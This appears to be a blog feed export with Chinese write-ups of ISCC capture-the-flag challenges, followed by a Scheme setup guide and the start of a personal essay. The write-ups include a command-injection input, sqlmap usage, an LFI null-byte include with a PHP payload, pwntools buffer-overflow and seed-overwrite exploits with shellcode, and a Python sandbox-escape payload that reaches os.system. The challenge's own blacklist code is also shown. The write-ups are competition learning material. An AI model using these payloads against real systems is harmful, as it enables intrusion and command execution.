PING出事了吧"></a>web300 PING出事了吧</h3><p>访问 <code>http://101.200.145.44/web2/</code> 一看感觉像是shell 命令拼接</p><p><img src="/media/14630355493646/14630380964753.jpg" alt></p><p>试了 “$”, “|” 等一些字符，全部提示输入格式错误，实在没思路了，手贱在网址后面加<code>.bak</code> ，<code>.txt</code> 意外发现存在 <code>http://101.200.145.44/web2/index.php.txt</code>，应该是<code>index.php</code> 的源码，看了下正则，构造 <code>127.0.0.1&amp;&amp;dir</code> 得到文件列表</p><p><img src="/media/14630355493646/14630383833367.jpg" alt></p><p>继续使用<code>dir</code> 发现 <code>flag.php</code>文件。之后犯傻了，在源码里发现文件包含，想到用文件包含去读flag，<code>http://101.200.145.44/web2/index.php?file=1C9976C230DA289C1C359CD2A7C02D48/flag.php</code></p><p> <img src="/media/14630355493646/14630384726958.jpg" alt></p><p>结果得到flag了。</p><p><img src="/media/14630355493646/14630385386141.jpg" alt></p><p>但是提交就是不对，开始怀疑它是不是又加密了。。。后面直接访问 <code>http://101.200.145.44/web2/1C9976C230DA289C1C359CD2A7C02D48/flag.php</code> 得到了另一个完全不一样的flag…..</p><p><img src="/media/14630355493646/14630386203749.jpg" alt></p><p>这个才是最终的flag。这个源码给的提示，我服！</p><h3 id="Web350-simple-injection"><a href="#Web350-simple-injection" class="headerlink" title="Web350 simple injection"></a>Web350 simple injection</h3><p>直接是一个登录页面，看题目，像是sql注入，试了一下发现<code>username</code>存在注入，但是按照平常的用sqlmap一直跑的话会一直500错误，感觉需要处理一下payload，后面才知道应该使用sqlmap的tamper。先用<code>burpsuite</code>导出post提交的内容，然后结合sqlmap:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r iscc.txt --tamper space2comment</span><br></pre></td></tr></table></figure><p><img src="/media/14630355493646/14635946016495.jpg" alt></p><p>得到帐号信息，md5解密为<code>yinquesiting</code>,登录后等到flag:</p><p><code>flag{51f52db9-5304-4dcf-acb1-6b0ec2e167f2}</code></p><h3 id="Web350-double-kill"><a href="#Web350-double-kill" class="headerlink" title="Web350 double kill"></a>Web350 double kill</h3><p>看见url里面出现了<code>page=submit</code>和<code>page=view</code>立马想到了文件包含。自己还能上传图片，应该去包含自己的图片干一些事情。图片是以上传的时间戳加后缀保存的，包含的时间直接加路径不行，需要加上<code>%00</code>截断。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.200.145.44/web5/index.php?page=uploads/1463714491.jpg%00</span><br></pre></td></tr></table></figure><p>先直接加<code>&lt;?php phpinfo(); ?&gt;</code>，结果回显是<code>you can do this</code>, 可能加上了过滤，换另一种写法 <code>&lt;script language=&quot;php&quot;&gt; phpinfo(); &lt;/script&gt;</code>，直接就回显flag了。。。好吧。。。</p><p><img src="/media/14630355493646/14639870445888.jpg" alt></p><p>其实还有更鸡贼的做法，服务器上传了图片后，它是没删除图片的，你可以根据前面解题人的时间，往前推一个小时，遍历这个小时内的所有图片，然后再包含看看，就能得到flag。不知道<code>1463714491.jpg</code>是哪位大神上传的。。。我直接找了这个图片通过了0_o</p><h3 id="Reverse150-Help-me"><a href="#Reverse150-Help-me" class="headerlink" title="Reverse150 Help me"></a>Reverse150 Help me</h3><p>下载附近，扔进IDA，简单看下，就是输入一个数字看是不是符合要求，如果正确则会给出：<code>Thanks for your key, now here is what you want : {flag}</code>， 逆向算法自己不会。。。只有简单爆破了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> PIPE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">999999999</span>, <span class="number">1</span>, <span class="number">-1</span>):</span><br><span class="line">    p = Popen([<span class="string">'./difficult'</span>], stdin=PIPE, stdout=PIPE)</span><br><span class="line">    output, err = p.communicate(input=str(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Thanks'</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="keyword">print</span> output</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>猜测是应该是比较大的数，所以倒着跑数字</p><p><code>Thanks for your key, now here is what you want : ISCC{n0t_5o-diffic1u7}</code></p><h3 id="Reverse150-仪式"><a href="#Reverse150-仪式" class="headerlink" title="Reverse150 仪式"></a>Reverse150 仪式</h3><p><img src="/media/14630355493646/14640888832453.jpg" alt></p><p><img src="/media/14630355493646/14640890393410.jpg" alt></p><p>IDA分析，定位到函数<code>sub_402860</code>，函数<code>sub_41CBE4</code>是获取输入框字符的，分别将<code>username</code>和<code>password</code>赋值给<code>String</code>和 数组<code>v8</code>， 直接能看出<code>username</code>为<code>WelcomeToISCC</code>，密码需要转换下，得到<code>IsInteresting</code>。其它是一些验证的，没仔细看了。结果在输入后点<code>GetFlag</code>没反应，题目描述说的是需要一些仪式，猜测是需要点击那四个尖角符号，瞎点一通就出flag了</p><p><img src="/media/14630355493646/14640946135162.jpg" alt></p><p><code>flag: {IItrsiWell}</code></p><h3 id="Pwn100"><a href="#Pwn100" class="headerlink" title="Pwn100"></a>Pwn100</h3><p>第一次做逆向题，很多都是在<code>Shrek_wzw</code>指点下完成的。</p><p>先静态分析：</p><p><img src="/media/14630355493646/14636452830598.jpg" alt></p><p>可以看出这个pwn本身很简单，<code>dword_804A160</code> 是一个函数指针，在得到用户输入后，执行该函数。</p><p><img src="/media/14630355493646/14636455848196.jpg" alt></p><p>输入的字符串是存到<code>0x804A060</code>地址开始的，而在 <code>call eax</code> 的时候是将 <code>0x804A160</code> 开始的4个字节放到 <code>eax</code> 里面，再调用函数的。所以最后的<code>payload</code>应该是 <code>&#39;A&#39;*0x100 + shellcode起始地址 + shellcode</code></p><p>这个需要注意的是<code>scanf</code>会对某些字符进行截断操作，所以shellcode要么encode一下，要么把产生截断字符的语句换成相等的其他语句。encode可以使用 Alpha3 进行编码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'101.200.187.112'</span>, <span class="number">9004</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'hffffk4diFkTpj02Tpk0T0AuEE0t3i4C3B3I7o2r1k0m7L2Z1o177M2p0X154y4N3j8L02'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.sendline(<span class="string">'A'</span> * <span class="number">0x100</span> + p32(<span class="number">0x804a164</span>) + shellcode)</span><br><span class="line">r.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.interactive()</span></span><br></pre></td></tr></table></figure><h3 id="Pwn250-guess"><a href="#Pwn250-guess" class="headerlink" title="Pwn250 guess"></a>Pwn250 guess</h3><p>有个相似的题目 <a href="https://www.securifera.com/blog/2015/09/09/mmactf-2015-rock-paper-scissors-rps/" target="_blank" rel="noopener">https://www.securifera.com/blog/2015/09/09/mmactf-2015-rock-paper-scissors-rps/</a></p><p><img src="/media/14630355493646/14637168641692.jpg" alt></p><p>分析代码，程序先用<code>time(0)</code>作为随机种子，然后需要猜测每次生成的随机数，如果连续猜对100次，就能得到flag。</p><p><img src="/media/14630355493646/14637166964214.jpg" alt></p><p>仔细看代码，随机种子在初始化之后，并不是马上就执行<code>srand(seed)</code>的，而是等待用户输入用户名之后才执行的，而对用户名却没有长度限制，那么我们可以输入一定长度的<code>name</code>来覆盖程序生成的<code>seed</code>。因为<code>rand()</code>本身是一个伪随机函数，当每次的<code>seed</code>的相同时，生成的随机数也是一样的。</p><p>上脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = CDLL(<span class="string">"libc.so.6"</span>)</span><br><span class="line">libc.srand(<span class="number">0x01010101</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_next_answer</span><span class="params">()</span>:</span></span><br><span class="line">    seed = libc.rand()</span><br><span class="line">    libc.srand(seed)</span><br><span class="line">    n = libc.rand() % <span class="number">0x1869F</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'101.200.187.112'</span>, <span class="number">9001</span>)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">name = <span class="string">'A'</span> * <span class="number">0x28</span> + <span class="string">'\x01'</span> * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">r.sendline(name)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    n = get_next_answer()</span><br><span class="line">    <span class="keyword">print</span> r.recv()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Sending: '</span> + str(n) + <span class="string">'\n'</span></span><br><span class="line">    r.sendline(str(n))</span><br><span class="line">    <span class="keyword">print</span> r.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p><code>flag: {1a28e5ea63f246745db921f924f3cf4b}</code></p><h3 id="Pwn300-pycalc"><a href="#Pwn300-pycalc" class="headerlink" title="Pwn300 pycalc"></a>Pwn300 pycalc</h3><p>一道python  sandbox 绕过的题目，相似ctf题都是用的<code>warnings.catch_warnings.__enter__.__func__.__globals__[&#39;linecache&#39;].checkcache.__globals__[&#39;os&#39;]</code>这个来绕过，这个题在这里有限制。直接题目给的<code>__builtins__</code>其实是有限制的，需要从其它模块中得到<code>__builtins__</code></p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### 59 是 warnings.catch_warnings 在list里的索引位置</span></span><br><span class="line">getattr(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'o'</span>+<span class="string">'s'</span>), <span class="string">'s'</span>+<span class="string">'yst'</span>+<span class="string">'em'</span>)(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure><p><img src="/media/14630355493646/14638106824527.jpg" alt></p><p><img src="/media/14630355493646/14638107053955.jpg" alt></p><p><code>flag{a23c60c8f9199ead4962705c7191fe3c}</code></p><p>可以再研究下它的原始脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"============================================="</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"   Simple calculator implemented by python   "</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"============================================="</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getexp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> raw_input(<span class="string">"&gt;&gt;&gt; "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hook_import_</span><span class="params">(name, *args, **kwargs)</span>:</span></span><br><span class="line">    module_blacklist = [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'time'</span>, <span class="string">'bdb'</span>, <span class="string">'bsddb'</span>, <span class="string">'cgi'</span>,</span><br><span class="line">            <span class="string">'CGIHTTPServer'</span>, <span class="string">'cgitb'</span>, <span class="string">'compileall'</span>, <span class="string">'ctypes'</span>, <span class="string">'dircache'</span>,</span><br><span class="line">            <span class="string">'doctest'</span>, <span class="string">'dumbdbm'</span>, <span class="string">'filecmp'</span>, <span class="string">'fileinput'</span>, <span class="string">'ftplib'</span>, <span class="string">'gzip'</span>,</span><br><span class="line">            <span class="string">'getopt'</span>, <span class="string">'getpass'</span>, <span class="string">'gettext'</span>, <span class="string">'httplib'</span>, <span class="string">'importlib'</span>, <span class="string">'imputil'</span>,</span><br><span class="line">            <span class="string">'linecache'</span>, <span class="string">'macpath'</span>, <span class="string">'mailbox'</span>, <span class="string">'mailcap'</span>, <span class="string">'mhlib'</span>, <span class="string">'mimetools'</span>,</span><br><span class="line">            <span class="string">'mimetypes'</span>, <span class="string">'modulefinder'</span>, <span class="string">'multiprocessing'</span>, <span class="string">'netrc'</span>, <span class="string">'new'</span>,</span><br><span class="line">            <span class="string">'optparse'</span>, <span class="string">'pdb'</span>, <span class="string">'pipes'</span>, <span class="string">'pkgutil'</span>, <span class="string">'platform'</span>, <span class="string">'popen2'</span>, <span class="string">'poplib'</span>,</span><br><span class="line">            <span class="string">'posix'</span>, <span class="string">'posixfile'</span>, <span class="string">'profile'</span>, <span class="string">'pstats'</span>, <span class="string">'pty'</span>, <span class="string">'py_compile'</span>,</span><br><span class="line">            <span class="string">'pyclbr'</span>, <span class="string">'pydoc'</span>, <span class="string">'rexec'</span>, <span class="string">'runpy'</span>, <span class="string">'shlex'</span>, <span class="string">'shutil'</span>, <span class="string">'SimpleHTTPServer'</span>,</span><br><span class="line">            <span class="string">'SimpleXMLRPCServer'</span>, <span class="string">'site'</span>, <span class="string">'smtpd'</span>, <span class="string">'socket'</span>, <span class="string">'SocketServer'</span>,</span><br><span class="line">            <span class="string">'subprocess'</span>, <span class="string">'sysconfig'</span>, <span class="string">'tabnanny'</span>, <span class="string">'tarfile'</span>, <span class="string">'telnetlib'</span>,</span><br><span class="line">            <span class="string">'tempfile'</span>, <span class="string">'Tix'</span>, <span class="string">'trace'</span>, <span class="string">'turtle'</span>, <span class="string">'urllib'</span>, <span class="string">'urllib2'</span>,</span><br><span class="line">            <span class="string">'user'</span>, <span class="string">'uu'</span>, <span class="string">'webbrowser'</span>, <span class="string">'whichdb'</span>, <span class="string">'zipfile'</span>, <span class="string">'zipimport'</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don't let user import these modules</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">'No you can\' import &#123;0&#125;!!!'</span>.format(forbid))</span><br><span class="line">    <span class="keyword">return</span> __import__(name, *args, **kwargs)    <span class="comment"># normal modules can be imported</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sandbox_filter</span><span class="params">(command)</span>:</span></span><br><span class="line">    blacklist = [<span class="string">'exec'</span>, <span class="string">'sh'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__setitem__'</span>, <span class="string">'='</span>, <span class="string">'open'</span>, <span class="string">'read'</span>, <span class="string">'sys'</span>, <span class="string">';'</span>, <span class="string">'os'</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> forbid <span class="keyword">in</span> command:   <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sandbox_exec</span><span class="params">(command)</span>:</span>      <span class="comment"># sandbox user input</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    __sandboxed_builtins__ = dict(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[<span class="string">'__import__'</span>] = _hook_import_    <span class="comment"># hook import</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">'open'</span>]</span><br><span class="line">    _global = &#123;</span><br><span class="line">        <span class="string">'__builtins__'</span> : __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> sandbox_filter(command) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Malicious user input detected!!!'</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    command = <span class="string">'result = '</span> + command</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">exec</span> command <span class="keyword">in</span> _global     <span class="comment"># do calculate in a sandboxed environment</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    result = _global[<span class="string">'result'</span>]  <span class="comment"># extract the result</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">banner()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    command = getexp()</span><br><span class="line">    <span class="keyword">print</span> sandbox_exec(command)</span><br></pre></td></tr></table></figure><p>和做题时猜想的一直，它自己构造了一个有限制的<code>__builtins__</code>变量，导致很多模块和相应的属性不能访问</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Basic50-Find-to-me&quot;&gt;&lt;a href=&quot;#Basic50-Find-to-me&quot; class=&quot;headerlink&quot; title=&quot;Basic50 Find to me&quot;&gt;&lt;/a&gt;Basic50 Find to me&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;已知仿射加密变换为 c = (11m+8) mod 26，试对密文 sjoyuxzr 解密&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;看这篇文章就能弄懂 &lt;a href=&quot;http://bbs.pediy.com/showthread.php?t=89299&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://bbs.pediy.com/showthread.php?t=89299&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag: itksuzlp&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;Basic50-好长的字符串&quot;&gt;&lt;a href=&quot;#Basic50-好长的字符串&quot; class=&quot;headerlink&quot; title=&quot;Basic50 好长的字符串&quot;&gt;&lt;/a&gt;Basic50 好长的字符串&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Vm0wd2QyVkhVWGhVYmxKV1YwZDRXRmxVUm5kVlJscHpXa2M1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;VjFKdGVGWlZNbmhQWVd4YWMxZHViRmROYWxaeVdWZDRZV01&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4WkhGU2JIQk9VbTVDZVZkV1pEUlRNazE0Vkc1T2FWSnVRazlWY&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;WtwdlZWWmtWMWt6YUZSTlZUVkpWbTEwYzJGV1NuVlJiR2hYWW&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xSV1JGcFdXbXRXTVZwMFpFWlNUbFp1UWpaV2Fra3hVakZaZVZO&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cmJGSmlWR3hXVm01d1IyUldjRmhsUjBacVZtczFNVmt3WkRSVk1ER&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;kZWbXBXVjFKc2NGaFdha3BIVTBaYWRWSnNTbGRTTTAwMQ==&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;多次解 base64 即可&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag: goodluckiscc&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="ctf" scheme="https://lazymind.me/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://lazymind.me/tags/ctf/"/>
    
      <category term="iscc" scheme="https://lazymind.me/tags/iscc/"/>
    
  </entry>
  
  <entry>
    <title>Mac 下配置 mit-scheme 环境</title>
    <link href="https://lazymind.me/2016/02/mac-mit-scheme-with-emacs-and-sublime-text/"/>
    <id>https://lazymind.me/2016/02/mac-mit-scheme-with-emacs-and-sublime-text/</id>
    <published>2016-02-17T00:00:00.000Z</published>
    <updated>2019-07-18T09:51:12.608Z</updated>
    
    <content type="html"><![CDATA[<h3 id="安装-mit-scheme"><a href="#安装-mit-scheme" class="headerlink" title="安装 mit-scheme"></a>安装 mit-scheme</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install mit-scheme</span><br></pre></td></tr></table></figure><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><ol><li><p>命令行输入 <code>mit-scheme</code> 进入交互模式</p></li><li><p>切换工作目录</p><pre><code>(cd &quot;~/workspaces&quot;)</code></pre></li><li><p>加载 scheme 源文件</p><pre><code>(load &quot;hello.scm&quot;)</code></pre></li><li><p>退出交互环境</p><pre><code>(quit)</code></pre></li></ol><h3 id="Emacs-中集成-mit-scheme"><a href="#Emacs-中集成-mit-scheme" class="headerlink" title="Emacs 中集成 mit-scheme"></a>Emacs 中集成 mit-scheme</h3><ul><li><p>编辑 <code>~/.emacs</code> 文件，加入下列语句:</p><pre><code>;;;Always do syntax(global-font-lock-mode 1)(setq show-paren-delay 0      show-paren-style &apos;parentheses)(show-paren-mode 1);;; 若直接使用 mit-scheme 后在 emacs 里执行 run-scheme 报错，则最好使用 mit-scheme 的绝对路径(setq scheme-program-name &quot;/usr/local/bin/mit-scheme&quot;)</code></pre></li><li><p>打开 emacs ，使用命令 <code>M-x run-scheme</code> 即可</p></li></ul><h3 id="sublime-text-中集成-mit-scheme"><a href="#sublime-text-中集成-mit-scheme" class="headerlink" title="sublime-text 中集成 mit-scheme"></a>sublime-text 中集成 mit-scheme</h3><ol><li><p>安装 <code>Scheme</code> 和 <code>SublimeREPL</code> 两个插件</p></li><li><p>避免出现 <em>无法加载Scheme.tmLanguage</em> 需手动安装<a href="https://github.com/masondesu/sublime-scheme-syntax" target="_blank" rel="noopener">sublime-scheme-syntax</a>, 放到 <code>Packages</code> 目录下即可</p><pre><code>cd ~/Library/Application\ Support/Sublime\ Text\ 3/Packagesgit clone git@github.com:masondesu/sublime-scheme-syntax.git</code></pre></li><li><p>Sublime左右显示两个Layout。</p><pre><code>View &gt; Layout &gt; Columns:2</code></pre></li><li><p>运行 scheme 交互</p><pre><code>Tools &gt; SublimeREPL &gt; Scheme</code></pre></li></ol><p>p.s.: 看来 sublime 的 <code>build</code> 文档，还是没法实现直接 <code>command + b</code> 来直接运行当前的 scheme 源文件</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h3 id=&quot;安装-mit-scheme&quot;&gt;&lt;a href=&quot;#安装-mit-scheme&quot; class=&quot;headerlink&quot; title=&quot;安装 mit-scheme&quot;&gt;&lt;/a&gt;安装 mit-scheme&lt;/h3&gt;&lt;figure class=&quot;highlight
        
      
    
    </summary>
    
      <category term="programming" scheme="https://lazymind.me/categories/programming/"/>
    
    
      <category term="sicp" scheme="https://lazymind.me/tags/sicp/"/>
    
      <category term="scheme" scheme="https://lazymind.me/tags/scheme/"/>
    
  </entry>
  
  <entry>
    <title>围城</title>
    <link href="https://lazymind.me/2016/01/where-is-the-dream/"/>
    <id>https://lazymind.me/2016/01/where-is-the-dream/</id>
    <published>2016-01-01T00:00:00.000Z</published>
    <updated>2019-07-18T09:51:12.608Z</updated>
    
    <content type="html"><![CDATA[<h3 id="本文的存在仅是对自己无能的愤怒而已。"><a href="#本文的存在仅是对自己无能的愤怒而已。" class="headerlink" title="本文的存在仅是对自己无能的愤怒而已。"></a>本文的存在仅是对自己无能的愤怒而已。</h3><blockquote><p>Red: These walls are kind of funny. First you hate ’em, then you get used to ’em. Enough time passes, gets so you depend on them. That’s institutionalized. They send you here for life, that’s exactly what they take. The part that counts, anyways.</p><p>—The Shawshank Redemption</p></blockquote><p>回望2015年，发现没留下什么回忆，唯一最重要的一件事就是我毕业了，我不再拥有学生时代了，虽然我有机会继续再当几年学生，不过还是放弃了，这也导致了后面一系列的事情。</p><p>去年，不对，应该是前年了，自己保研保到了国防科技大学，而且从机械保到了自己向往已久的计算机去了，这件事在外人来看是特别好的一件事，因为当时自己还是 PLA，国防科大对于在校的 PLA 来说是最好的去处了。不过对于自己来说却没什么感觉，那时候自己心中有个念想，就是退出 PLA。（这又得说高考填志愿了，当时脑子进水瞎填，连什么是提前批都不知道就报了。）因为这个想法一直存在于脑海里，自己也通过各种方式了解 PLA 研究生后的情况，发现我待在了一座围城里，我特别向往外面的生活。后来又在网上看到各种言论，越发觉得待在 PLA 